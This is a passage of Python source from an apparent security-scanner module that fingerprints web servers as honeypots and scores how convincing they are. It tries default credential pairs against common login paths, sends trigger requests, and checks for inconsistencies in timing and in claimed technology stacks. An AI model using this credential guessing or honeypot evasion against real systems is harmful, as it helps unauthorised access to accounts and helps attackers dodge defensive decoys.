            evidence=f"Statuses: {set(statuses)}; Consistency score: {inconsistency_score:.2f}",
            asset=base_url,
            points_deducted=0,
            remediation="",
            dread_score=0.5,
        ))

    return {
        "findings": findings,
        "inconsistency_score": inconsistency_score,
        "unique_statuses": unique_statuses,
        "unique_bodies": unique_bodies,
        "unique_headers": unique_headers,
        "is_honeypot_like": is_honeypot_like,
    }


# ═══════════════════════════════════════════════════════════════════════════
# Check 5: Technology Stack Anomaly Detection
# ═══════════════════════════════════════════════════════════════════════════


def _check_tech_stack_anomalies(
    base_url: str, timeout: int, verify_tls: bool
) -> Dict[str, Any]:
    """Detect if the server claims technologies that don't match observed behavior.

    Honeypots often claim one technology stack (via headers) but exhibit behavior
    inconsistent with that stack (e.g., claiming IIS but serving nginx-formatted errors).
    """
    findings: List[Finding] = []
    anomalies: List[str] = []

    # Get the main page
    main_resp = _safe_probe(base_url, timeout=timeout, verify_tls=verify_tls)
    headers = main_resp.get("headers", {})
    body = main_resp.get("body", "")

    # Collect claimed technologies from headers
    claimed_techs: List[str] = []

    server_hdr = headers.get("server", "").lower()
    powered_by = headers.get("x-powered-by", "").lower()

    if "nginx" in server_hdr:
        claimed_techs.append("nginx")
    if "apache" in server_hdr:
        claimed_techs.append("apache")
    if "iis" in server_hdr:
        claimed_techs.append("iis")
    if "asp.net" in powered_by or "asp" in powered_by:
        claimed_techs.append("ASP.NET")
    if "php" in powered_by or "php" in server_hdr:
        claimed_techs.append("PHP")
    if "express" in powered_by:
        claimed_techs.append("Express")
    if "python" in powered_by or "werkzeug" in powered_by or "gunicorn" in server_hdr or "uvicorn" in server_hdr:
        claimed_techs.append("Python")
    if "java" in powered_by or "tomcat" in server_hdr or "jetty" in server_hdr:
        claimed_techs.append("Java")
    if "next" in powered_by:
        claimed_techs.append("Next.js")
    if "openresty" in server_hdr:
        claimed_techs.append("OpenResty")

    # Detect actual technologies from body content
    observed_techs: List[str] = []
    if re.search(r'(?i)<meta\s+name=["\x27]generator["\x27]\s+content=["\x27]WordPress', body):
        observed_techs.append("wordpress")
    if re.search(r"(?i)wp-content|wp-includes", body):
        observed_techs.append("wordpress")
    if re.search(r"(?i)__next|_next/static|next-route-annotator", body):
        observed_techs.append("next.js")
    if re.search(r"(?i)django|csrfmiddlewaretoken", body):
        observed_techs.append("django")
    if re.search(r"(?i)laravel|laravel_session", body):
        observed_techs.append("laravel")
    if re.search(r"(?i)rails|csrf-token|turbolinks", body):
        observed_techs.append("rails")
    if re.search(r"(?i)\.php", body):
        observed_techs.append("php")
    if re.search(r'(?i)\.asp[x]?', body):
        observed_techs.append("asp.net")
    if re.search(r'(?i)\.jsp|servlet', body):
        observed_techs.append("java")
    if re.search(r"(?i)node\.js|express|socket\.io", body):
        observed_techs.append("node")

    # Check against TECH_STACK_INCONSISTENCIES
    for rule in TECH_STACK_INCONSISTENCIES:
        claimed = rule["claimed_tech"]
        if claimed not in claimed_techs:
            continue
        for incompatible in rule["incompatible_with"]:
            for obs in observed_techs:
                if re.search(incompatible, obs, re.IGNORECASE):
                    anomalies.append(
                        f"Claims {claimed} (header) but body shows {obs} — {rule['description']}"
                    )

    # Check for contradictory headers
    if "nginx" in server_hdr and "iis" in server_hdr:
        anomalies.append("Server header claims both nginx and IIS — impossible combination")
    if "apache" in server_hdr and "nginx" in server_hdr:
        anomalies.append("Server header claims both Apache and nginx — impossible combination")

    # Check for PHP version in headers but no PHP indicators in body at all
    # (on a page that should have dynamic content)
    if "php" in powered_by and len(body) > 500:
        if not re.search(r"(?i)php|\$|->|::", body):
            anomalies.append(
                "Claims PHP via X-Powered-By but body shows no PHP artifacts "
                "(no PHP-generated content, variables, or patterns)"
            )

    if anomalies:
        severity = "high" if len(anomalies) >= 3 else (
            "medium" if len(anomalies) >= 2 else "low"
        )
        findings.append(Finding(
            title="Technology Stack Anomalies Detected",
            severity=severity,
            category="Honeypot Detection",
            module="honeypot_dance",
            description=(
                f"The server claims to run {', '.join(claimed_techs) if claimed_techs else 'no identifiable technology'} "
                f"but exhibits behaviors inconsistent with that stack. Honeypots frequently "
                f"mismatch their claimed and actual technology. Found {len(anomalies)} anomalies."
            ),
            evidence="; ".join(anomalies[:8]),
            asset=base_url,
            points_deducted=min(len(anomalies) * 10, 30),
            remediation="Ensure Server and X-Powered-By headers accurately reflect the "
                        "actual technology stack. Inconsistent headers can flag the server as a honeypot.",
            dread_score=min(len(anomalies) * 2.5, 8.0),
        ))
    else:
        findings.append(Finding(
            title="Technology Stack is Consistent",
            severity="info",
            category="Honeypot Detection",
            module="honeypot_dance",
            description=(
                f"Claimed technologies ({', '.join(claimed_techs) if claimed_techs else 'none detected'}) "
                f"are consistent with observed body content and behavior."
            ),
            evidence=f"Claimed: {claimed_techs}; Observed: {observed_techs}",
            asset=base_url,
            points_deducted=0,
            remediation="",
            dread_score=0.5,
        ))

    return {
        "findings": findings,
        "claimed_techs": claimed_techs,
        "observed_techs": observed_techs,
        "anomalies": anomalies,
    }


# ═══════════════════════════════════════════════════════════════════════════
# Check 6: Default Credential Detection
# ═══════════════════════════════════════════════════════════════════════════


def _check_default_credentials(
    base_url: str, timeout: int, verify_tls: bool
) -> Dict[str, Any]:
    """Test common honeypot default credentials against login endpoints.

    Many honeypots accept well-known default credentials (admin/admin, root/root, etc.)
    as a way to lure attackers and capture their activity.
    """
    findings: List[Finding] = []
    accepted_creds: List[Dict[str, Any]] = []

    # Common login form paths
    login_paths = [
        "/login",
        "/admin/login",
        "/wp-login.php",
        "/auth/login",
        "/api/auth/login",
        "/signin",
        "/api/login",
        "/user/login",
        "/administrator/login",
    ]

    # Find working login paths
    working_paths: List[str] = []
    for path in login_paths:
        url = _url_join(base_url, path)
        resp = _safe_probe(url, timeout=timeout, verify_tls=verify_tls)
        status = resp.get("status", 0)
        body = resp.get("body", "")
        if status == 200 and len(body) > 50:
            working_paths.append(path)

    # Test each default credential against working login paths
    for path in working_paths:
        url = _url_join(base_url, path)
        for cred in HONEYPOT_DEFAULT_CREDENTIALS:
            # Try JSON body
            json_body = '{{"username": "{}", "password": "{}"}}'.format(
                cred["username"], cred["password"]
            ).encode("utf-8")
            resp = _safe_probe(
                url, method="POST", body=json_body,
                headers={"Content-Type": "application/json"},
                timeout=timeout, verify_tls=verify_tls,
            )

            status = resp.get("status", 0)
            body = resp.get("body", "")

            # Check if login succeeded (status 200 with a session/token/redirect indicator)
            is_accepted = False
            accept_reason = ""

            if status == 200:
                # Check for success indicators in response
                if re.search(r"(?i)(token|session|welcome|dashboard|success|redirect)", body):
                    is_accepted = True
                    accept_reason = "200 with success indicators (token/session/welcome)"
                # Check for set-cookie with session
                resp_headers = resp.get("headers", {})
                cookie = resp_headers.get("set-cookie", "")
                if re.search(r"(?i)(session|token|auth|sid|jsessionid)", cookie):
                    is_accepted = True
                    accept_reason = "200 with auth session cookie"
            elif status == 302 or status == 301:
                location = resp.get("headers", {}).get("location", "")
                if re.search(r"(?i)(dashboard|admin|home|index|welcome)", location):
                    is_accepted = True
                    accept_reason = f"{status} redirect to {location}"

            if is_accepted:
                accepted_creds.append({
                    "path": path,
                    "username": cred["username"],
                    "password": cred["password"],
                    "source": cred["source"],
                    "reason": accept_reason,
                })

            # Also try form-encoded body
            form_body = "username={}&password={}".format(
                urllib.parse.quote(cred["username"], safe=""),
                urllib.parse.quote(cred["password"], safe=""),
            ).encode("utf-8")
            resp2 = _safe_probe(
                url, method="POST", body=form_body,
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                timeout=timeout, verify_tls=verify_tls,
            )

            status2 = resp2.get("status", 0)
            body2 = resp2.get("body", "")
            resp_headers2 = resp2.get("headers", {})

            is_accepted2 = False
            accept_reason2 = ""

            if status2 == 200:
                if re.search(r"(?i)(token|session|welcome|dashboard|success|redirect)", body2):
                    is_accepted2 = True
                    accept_reason2 = "200 with success indicators (form-encoded)"
                cookie2 = resp_headers2.get("set-cookie", "")
                if re.search(r"(?i)(session|token|auth|sid|jsessionid)", cookie2):
                    is_accepted2 = True
                    accept_reason2 = "200 with auth session cookie (form-encoded)"
            elif status2 in (301, 302):
                loc2 = resp_headers2.get("location", "")
                if re.search(r"(?i)(dashboard|admin|home|index|welcome)", loc2):
                    is_accepted2 = True
                    accept_reason2 = f"{status2} redirect to {loc2} (form-encoded)"

            if is_accepted2:
                # Avoid duplicate if already found via JSON
                already_found = any(
                    c["path"] == path and c["username"] == cred["username"]
                    for c in accepted_creds
                )
                if not already_found:
                    accepted_creds.append({
                        "path": path,
                        "username": cred["username"],
                        "password": cred["password"],
                        "source": cred["source"],
                        "reason": accept_reason2,
                    })

    if accepted_creds:
        cred_evidence = "; ".join(
            f"{c['path']} -> {c['username']}:{c['password']} ({c['source']}) [{c['reason']}]"
            for c in accepted_creds[:10]
        )
        findings.append(Finding(
            title=f"Honeypot Default Credentials Accepted ({len(accepted_creds)} found)",
            severity="high",
            category="Honeypot Detection",
            module="honeypot_dance",
            description=(
                f"{len(accepted_creds)} common honeypot default credentials were accepted by the target. "
                f"Honeypots frequently use well-known default credentials to entice attackers. "
                f"This is a strong indicator of honeypot behavior, though it could also "
                f"indicate a misconfigured legitimate service."
            ),
            evidence=cred_evidence,
            asset=base_url,
            points_deducted=min(len(accepted_creds) * 8, 30),
            remediation="Change all default credentials immediately. If this is a honeypot, "
                        "consider using unique credentials that don't match known honeypot databases.",
            dread_score=7.5,
        ))
    else:
        findings.append(Finding(
            title="No Honeypot Default Credentials Accepted",
            severity="info",
            category="Honeypot Detection",
            module="honeypot_dance",
            description=(
                f"Tested {len(HONEYPOT_DEFAULT_CREDENTIALS)} default credential pairs against "
                f"{len(working_paths)} login endpoints. None were accepted."
            ),
            evidence=f"Probed {len(working_paths)} login paths, "
                    f"tested {len(HONEYPOT_DEFAULT_CREDENTIALS)} credential pairs",
            asset=base_url,
            points_deducted=0,
            remediation="",
            dread_score=0.5,
        ))

    return {
        "findings": findings,
        "accepted_creds": accepted_creds,
        "login_paths_tested": login_paths,
        "working_paths": working_paths,
    }


# ═══════════════════════════════════════════════════════════════════════════
# Check 7: Interaction Pattern Analysis
# ═══════════════════════════════════════════════════════════════════════════


def _analyze_interaction_patterns(
    base_url: str, timeout: int, verify_tls: bool
) -> Dict[str, Any]:
    """Send known honeypot trigger commands and analyze response patterns.

    Honeypots are designed to log specific attack patterns. When triggered, they
    often respond differently than real servers — either by logging everything
    perfectly (and thus having predictable responses) or by failing in telltale ways.
    """
    findings: List[Finding] = []
    trigger_results: List[Dict[str, Any]] = []
    honeypot_indicators: List[str] = []

    # Get a baseline normal response
    baseline_resp = _safe_probe(base_url, timeout=timeout, verify_tls=verify_tls)
    baseline_status = baseline_resp.get("status", 0)
    baseline_body_len = len(baseline_resp.get("body", ""))
    baseline_headers = set(
        k.lower() for k in baseline_resp.get("headers", {}).keys()
    )

    for payload in TRIGGER_PAYLOADS:
        url = _url_join(base_url, payload["path"])
        extra_headers = payload.get("headers")
        body = payload.get("body")
        method = payload.get("method", "GET")

        resp = _safe_probe(
            url, method=method, body=body,
            headers=extra_headers,
            timeout=timeout, verify_tls=verify_tls,
        )

        status = resp.get("status", 0)
        resp_body = resp.get("body", "")
        resp_body_len = len(resp_body)
        resp_headers = set(
            k.lower() for k in resp.get("headers", {}).keys()
        )

        is_honeypot_like = False
        reason = ""

        # Indicator 1: Response is identical to baseline (for obviously different requests)
        if (
            status == baseline_status
            and resp_body_len == baseline_body_len
            and _body_fingerprint(resp_body) == _body_fingerprint(baseline_resp.get("body", ""))
            and method != "GET"
        ):
            is_honeypot_like = True
            reason = f"{method} to {payload['path']} returns identical response to GET /"

        # Indicator 2: Perfectly formatted error for malformed request
        if status in (400, 403, 404, 405, 500):
            if re.search(
                r"<!doctype|<html", resp_body, re.IGNORECASE
            ) and re.search(
                r"</\s*(html|body)>\s*$", resp_body, re.MULTILINE | re.IGNORECASE
            ):
                is_honeypot_like = True
                reason = f"Perfectly structured HTML error page for {method} {payload['path']}"

        # Indicator 3: All trigger requests return the same error
        if trigger_results:
            prev = trigger_results[-1]
            if (
                status == prev["status"]
                and _body_fingerprint(resp_body) == prev["body_fp"]
                and payload["name"] != prev["name"]
            ):
                is_honeypot_like = True
                reason = (
                    f"Same response as previous trigger '{prev['name']}' "
                    f"(status={status}, body_fp={_body_fingerprint(resp_body)})"
                )

        # Indicator 4: Headers are suspiciously consistent with baseline
        if resp_headers == baseline_headers and method in ("POST", "PUT", "DELETE", "TRACE", "OPTIONS"):
            is_honeypot_like = True
            reason = f"Headers identical to baseline for {method} request"

        # Indicator 5: Response time is suspiciously consistent
        elapsed = resp.get("elapsed", 0)
        baseline_elapsed = baseline_resp.get("elapsed", 0)
        if elapsed > 0 and baseline_elapsed > 0:
            time_ratio = elapsed / baseline_elapsed
            if 0.95 <= time_ratio <= 1.05 and method != "GET":
                is_honeypot_like = True
                reason = f"Response time ratio={time_ratio:.3f} (nearly identical to baseline)"

        trigger_results.append({
            "name": payload["name"],
            "method": method,
            "path": payload["path"],
            "status": status,
            "body_fp": _body_fingerprint(resp_body),
            "body_len": resp_body_len,
            "elapsed": elapsed,
            "is_honeypot_like": is_honeypot_like,
            "reason": reason,
        })

        if is_honeypot_like:
            honeypot_indicators.append(f"[{payload['name']}] {reason}")

    honeypot_like_count = sum(1 for r in trigger_results if r["is_honeypot_like"])
    honeypot_ratio = honeypot_like_count / len(trigger_results) if trigger_results else 0

    if honeypot_ratio >= 0.5:
        severity = "high"
        points = 25
        dread = 7.0
    elif honeypot_ratio >= 0.3:
        severity = "medium"
        points = 15
        dread = 5.0
    elif honeypot_ratio >= 0.15:
        severity = "low"
        points = 8
        dread = 3.0
    else:
        severity = "info"
        points = 0
        dread = 0.5

    if honeypot_indicators:
        findings.append(Finding(
            title=f"Honeypot Interaction Patterns Detected ({honeypot_like_count}/{len(trigger_results)})",
            severity=severity,
            category="Honeypot Detection",
            module="honeypot_dance",
            description=(
                f"{honeypot_like_count} out of {len(trigger_results)} trigger payloads produced responses "
                f"consistent with honeypot behavior (ratio: {honeypot_ratio:.0%}). Honeypots often "
                f"respond to attack payloads with template-driven, perfectly consistent responses "
                f"rather than the varied, sometimes messy responses of real servers."
            ),
            evidence="; ".join(honeypot_indicators[:10]),
            asset=base_url,
            points_deducted=points,
            remediation="Ensure the server handles malicious/unusual requests with natural "
                        "variation in responses. Avoid using a single error template for all "
                        "request types.",
            dread_score=dread,
        ))
    else:
        findings.append(Finding(
            title="Interaction Patterns Appear Natural",
            severity="info",
            category="Honeypot Detection",
            module="honeypot_dance",
            description=(
                f"None of the {len(trigger_results)} trigger payloads produced responses "
                f"consistent with honeypot behavior. The server handles unusual requests "
                f"with natural variation."
            ),
            evidence=f"Tested {len(trigger_results)} trigger payloads, 0 honeypot-like responses",
            asset=base_url,
            points_deducted=0,
            remediation="",
            dread_score=0.5,
        ))

    return {
        "findings": findings,
        "trigger_results": trigger_results,
        "honeypot_like_count": honeypot_like_count,
        "honeypot_ratio": honeypot_ratio,
    }


# ═══════════════════════════════════════════════════════════════════════════
# Check 8: Honeypot Effectiveness Scoring
# ═══════════════════════════════════════════════════════════════════════════


def _score_honeypot_effectiveness(
    base_url: str,
    timing_result: Dict[str, Any],
    perfection_result: Dict[str, Any],
    fingerprint_result: Dict[str, Any],
    consistency_result: Dict[str, Any],
    tech_result: Dict[str, Any],
    credential_result: Dict[str, Any],
    interaction_result: Dict[str, Any],
) -> List[Finding]:
    """If the target appears to be a honeypot, score how convincing it is.

    A high effectiveness score means the honeypot is very convincing and would
    fool most attackers. A low score means it has obvious tells.
    """
    findings: List[Finding] = []

    # Aggregate signals
    signals: List[Dict[str, Any]] = []

    # Timing: lower CV = more honeypot-like (less effective disguise)
    timing_cv = timing_result.get("cv")
    if timing_cv is not None:
        signals.append({
            "name": "Timing Naturalness",
            "score": min(timing_cv / 0.15, 1.0),  # Higher = more natural = more effective
            "weight": 0.15,
            "detail": f"CV={timing_cv:.4f}",
        })

    # Error perfection: higher suspicion = less effective disguise
    perfection_suspicion = perfection_result.get("suspicion_score", 0)
    signals.append({
        "name": "Error Naturalness",
        "score": max(1.0 - perfection_suspicion / 3.0, 0.0),
        "weight": 0.15,
        "detail": f"Suspicion={perfection_suspicion:.2f}",
    })

    # Fingerprint stealth: fewer detections = more effective
    detected_count = len(fingerprint_result.get("detected", []))
    signals.append({
        "name": "Fingerprint Stealth",
        "score": max(1.0 - detected_count * 0.3, 0.0),
        "weight": 0.25,
        "detail": f"Detected={detected_count} signatures",
    })

    # Behavioral consistency: more inconsistency = more effective (more realistic)
    consistency = consistency_result.get("inconsistency_score", 0)
    signals.append({
        "name": "Behavioral Realism",
        "score": min(consistency / 0.8, 1.0),
        "weight": 0.15,
        "detail": f"Inconsistency={consistency:.2f}",
    })

    # Tech stack: fewer anomalies = more effective
    anomaly_count = len(tech_result.get("anomalies", []))
    signals.append({
        "name": "Tech Stack Coherence",
        "score": max(1.0 - anomaly_count * 0.25, 0.0),
        "weight": 0.15,
        "detail": f"Anomalies={anomaly_count}",
    })

    # Credentials: none accepted = more effective
    accepted_count = len(credential_result.get("accepted_creds", []))
    signals.append({
        "name": "Credential Realism",
        "score": max(1.0 - accepted_count * 0.2, 0.0),
        "weight": 0.10,
        "detail": f"Accepted={accepted_count} default creds",
    })

    # Interaction patterns: lower ratio = more effective
    hp_ratio = interaction_result.get("honeypot_ratio", 0)
    signals.append({
        "name": "Interaction Realism",
        "score": max(1.0 - hp_ratio, 0.0),
        "weight": 0.05,
        "detail": f"Honeypot ratio={hp_ratio:.0%}",
    })

    # Weighted effectiveness score
    total_effectiveness = 0.0
    weighted_details: List[str] = []
    for sig in signals:
        contribution = sig["score"] * sig["weight"]
        total_effectiveness += contribution
        weighted_details.append(
            f"{sig['name']}: {sig['score']:.0%} (w={sig['weight']:.2f}, {sig['detail']})"
        )

    # Determine if this IS a honeypot
    is_honeypot = False
    honeypot_evidence: List[str] = []

    if detected_count > 0:
        is_honeypot = True
        names = ", ".join(d["name"] for d in fingerprint_result["detected"])
        honeypot_evidence.append(f"Direct fingerprint match: {names}")

    if timing_result.get("suspicious"):
        is_honeypot = True
        honeypot_evidence.append("Suspiciously precise timing")

    if consistency_result.get("is_honeypot_like"):
        is_honeypot = True
        honeypot_evidence.append("Overly consistent behavioral responses")

    if accepted_count > 2:
        is_honeypot = True
        honeypot_evidence.append(f"{accepted_count} default credentials accepted")

    if hp_ratio >= 0.5:
        is_honeypot = True
        honeypot_evidence.append(f"{hp_ratio:.0%} of trigger payloads produced honeypot-like responses")

    if is_honeypot:
        # Rate effectiveness
        if total_effectiveness >= 0.8:
            effectiveness_label = "HIGHLY CONVINCING"
            effectiveness_desc = (
                "This honeypot is very well-disguised and would likely fool "
                "most automated scanners and casual attackers."
            )
        elif total_effectiveness >= 0.6:
            effectiveness_label = "MODERATELY CONVINCING"
            effectiveness_desc = (
                "This honeypot has some realistic elements but exhibits "
                "noticeable tells under closer inspection."
            )
        elif total_effectiveness >= 0.4:
            effectiveness_label = "SOMEWHAT CONVINCING"
            effectiveness_desc = (
                "This honeypot has obvious flaws that would be detected by "
                "moderately thorough analysis."
            )
        else:
            effectiveness_label = "POORLY DISGUISED"
            effectiveness_desc = (
                "This honeypot has multiple obvious tells and would be easily "
                "identified by any scanner."
            )

        severity = "high" if total_effectiveness >= 0.7 else (
            "medium" if total_effectiveness >= 0.4 else "low"
        )

        findings.append(Finding(
            title=f"Honeypot Identified — Effectiveness: {total_effectiveness:.0%} ({effectiveness_label})",
            severity=severity,
            category="Honeypot Detection",
            module="honeypot_dance",
            description=(
                f"The target is assessed as a honeypot with {total_effectiveness:.0%} effectiveness. "
                f"{effectiveness_desc} "
                f"Evidence: {'; '.join(honeypot_evidence)}"
            ),
            evidence="Breakdown: " + " | ".join(weighted_details),
            asset=base_url,
            points_deducted=int(total_effectiveness * 40),
            remediation=(
                f"Honeypot effectiveness improvement: "
                f"1) Add timing jitter to responses (target CV > 0.10). "
                f"2) Remove identifying headers and honeypot-specific paths. "
                f"3) Vary error page content and structure. "
                f"4) Ensure technology stack claims match actual behavior. "
                f"5) Reject default credentials. "
                f"6) Introduce natural behavioral inconsistency."
            ),
            dread_score=total_effectiveness * 9.0,
        ))
    else:
        findings.append(Finding(
            title=f"Target Unlikely to be a Honeypot (Effectiveness Baseline: {total_effectiveness:.0%})",
            severity="info",
            category="Honeypot Detection",
            module="honeypot_dance",
            description=(
                f"No strong honeypot indicators were detected. The target shows {total_effectiveness:.0%} "
                f"baseline 'realism' which means it exhibits natural server behavior across all "
                f"analyzed dimensions. This does not guarantee it is not a honeypot, but no "
                f"conclusive indicators were found."
            ),
            evidence="Breakdown: " + " | ".join(weighted_details),
            asset=base_url,
            points_deducted=0,
            remediation="",
            dread_score=0.5,
        ))

    return findings


# ═══════════════════════════════════════════════════════════════════════════
# Main Entry Point
# ═══════════════════════════════════════════════════════════════════════════


def run_honeypot_dance(
    target: str,
    base_url: str,
    timeout: int = 8,
    verify_tls: bool = True,
) -> List[Finding]:
    """Run the full honeypot detection and effectiveness analysis.

    Args:
        target: The target identifier (hostname/IP) for evidence tagging.
        base_url: The base URL to probe (e.g., "https://example.com").
        timeout: Per-request timeout in seconds.
        verify_tls: Whether to verify TLS certificates.

    Returns:
        A list of Finding objects detailing honeypot detection results.
    """
    all_findings: List[Finding] = []

    # ── Check 1: Response Timing Analysis ──
    timing_result = _analyze_response_timing(base_url, timeout, verify_tls)
    all_findings.extend(timing_result["findings"])

    # ── Check 2: Error Message Perfection ──
    perfection_result = _check_error_perfection(base_url, timeout, verify_tls)
    all_findings.extend(perfection_result["findings"])

    # ── Check 3: Known Honeypot Fingerprinting ──
    fingerprint_result = _check_honeypot_fingerprints(base_url, timeout, verify_tls)
    all_findings.extend(fingerprint_result["findings"])

    # ── Check 4: Behavioral Consistency ──
    consistency_result = _check_behavioral_consistency(base_url, timeout, verify_tls)
    all_findings.extend(consistency_result["findings"])

    # ── Check 5: Technology Stack Anomaly Detection ──
    tech_result = _check_tech_stack_anomalies(base_url, timeout, verify_tls)
    all_findings.extend(tech_result["findings"])

    # ── Check 6: Default Credential Detection ──
    credential_result = _check_default_credentials(base_url, timeout, verify_tls)
    all_findings.extend(credential_result["findings"])

    # ── Check 7: Interaction Pattern Analysis ──
    interaction_result = _analyze_interaction_patterns(base_url, timeout, verify_tls)
    all_findings.extend(interaction_result["findings"])

    # ── Check 8: Honeypot Effectiveness Scoring ──
    effectiveness_findings = _score_honeypot_effectiveness(
        base_url=base_url,
        timing_result=timing_result,
        perfection_result=perfection_result,
        fingerprint_result=fingerprint_result,
        consistency_result=consistency_result,
        tech_result=tech_result,
        credential_result=credential_result,
        interaction_result=interaction_result,
    )
    all_findings.extend(effectiveness_findings)

    # Tag all findings with the target
    for f in all_findings:
        if not f.asset or f.asset == base_url:
            f.asset = target

    return all_findings
